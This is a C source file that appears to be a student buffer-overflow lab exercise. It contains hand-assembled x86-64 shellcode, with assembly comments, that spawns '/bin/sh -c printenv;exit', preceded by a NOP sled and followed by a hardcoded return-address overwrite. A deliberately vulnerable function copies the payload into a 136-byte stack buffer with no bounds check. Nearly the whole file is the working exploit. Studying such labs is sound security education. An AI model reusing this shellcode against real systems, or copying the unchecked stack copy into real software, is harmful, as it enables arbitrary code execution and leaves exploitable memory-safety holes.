#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int main(int argc, char * argv[]){

    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// Variable to contain hex bytes of shell code
char compromise[159] = {
    0x90, 0x90, 0x90, 0x90, 0x90, //adding no-ops, don't know how many
    0xEB, 0x4F,                  //  start:     jmp short codeEnd
    0x5E,                    //  start2:    pop rsi
    0x48, 0x31, 0xC0,                //             xor rax, rax
    0x88, 0x46, 0x07,                //             mov [rsi + flagStr-exeStr - 2],al
    0x88, 0x46, 0x0B,                //             mov [rsi + cmdStr-exeStr - 1],al
    0x88, 0x46, 0x19,                //             mov [rsi + arrayAddr-exeStr - 1],al
    0x48, 0x89, 0x46, 0x32,              //             mov [rsi + arrayAddr-exeStr + 24],rax
    0x48, 0x89, 0x76, 0x1A,              //             mov [rsi + arrayAddr - exeStr], rsi
    0x48, 0x8D, 0x7E, 0x09,              //             lea rdi, [rsi + flagStr - exeStr]
    0x48, 0x89, 0x7E, 0x1E,              //             mov [rsi + arrayAddr - exeStr + 4], rdi
    0x48, 0x8D, 0x7E, 0x0C,              //             lea rdi, [rsi + cmdStr - exeStr]
    0x48, 0x89, 0x7E, 0x22,              //             mov [rsi + arrayAddr - exeStr + 8], rdi
    0x48, 0x89, 0xE2,                //             mov rdx, rsp
    0x48, 0xC1, 0xEA, 0x20,              //             shr rdx, 32
    0x48, 0xC1, 0xE2, 0x20,              //             shl rdx, 32
    0xB9, 0x38, 0xE1, 0xFF, 0xF7,            //             mov rcx, 0xf7ffe138
    0x48, 0x09, 0xCA,                //             or rdx, rcx
    0x48, 0x31, 0xC0,                //             xor rax, rax
    0x48, 0x89, 0xF7,                //             mov rdi, rsi
    0x48, 0x8D, 0x76, 0x1A,              //             lea rsi, [rsi + arrayAddr - exeStr]
    0x48, 0x8B, 0x12,                //             mov rdx,[rdx]
    0x0F, 0x05,                  //             syscall
    0x48, 0x89, 0xC7,                //             mov rdi,rax
    0x48, 0x31, 0xC0,                //             xor rax, rax
    0x0F, 0x05,                  //             syscall
    0xE8, 0xAC, 0xFF, 0xFF, 0xFF,            //  codeEnd:   call start2
    0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x58, 0x79,   //  exeStr:    db "/bin/shXy"
    0x2D, 0x63, 0x58,                //  flagStr:   db "-cX"
    0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x6E, 0x76, 0x3B,   //  cmdStr:    db "printenv;exitX"
    0x65, 0x78, 0x69, 0x74, 0x58,            //
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    //  arrayAddr: dq exeStr
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    //             dq flagStr
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,    //             dq cmdStr
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,      //             dq 0xffffffffffffffff
    
    0x98, 0xE0, 0xFF, 0xFF,0xFF, 0x7F, 0x00 //Return address stack replace
};
// rsp 0x7fffffffe098

// string variable to probe the stack and find the correct
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxx" // 152 x's + 8 cap letters
    "MNOPWXYZ" // 0x4d4e4f505758595a
    "xxxxxxxx"
; // &environ 0x7ffff7ffe138

void doTest(){
    char buffer[136];
    register int i;
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	    buffer[i] = compromise[i];
    }
}

